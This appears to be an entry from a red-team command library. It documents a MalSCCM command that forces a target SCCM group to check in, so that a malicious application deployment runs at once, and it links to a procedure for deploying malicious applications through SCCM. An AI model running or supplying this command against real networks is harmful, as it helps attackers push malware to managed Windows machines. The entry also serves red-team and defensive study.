---
id: 35bd2be2-1410-485d-bf9e-d856958c7cb5
type: command
executor: powershell
data: 'MalSCCM.exe checkin /groupname:$_GROUP_NAME'
output: null
created_at: '2023-04-06T03:56:08.126942+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - sccm
  - execution
verified: true
validated: true
---

# Checkin-target-group-using-MalSCCM

## Command

```powershell
MalSCCM.exe checkin /groupname:$_GROUP_NAME
```

## Description

Forces the specified group to check in with SCCM, triggering immediate policy and deployment application.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /groupname:$_GROUP_NAME | Group to check in | Yes |

## Examples

### Basic Usage

```powershell
MalSCCM.exe checkin /groupname:TargetGroup
```

## Expected Output

Check-in initiated for 'TargetGroup'.

Confirmation; monitor targets for execution.

## Related

- [[procedures/Create-and-Deploy-Malicious-Application-via-SCCM]]
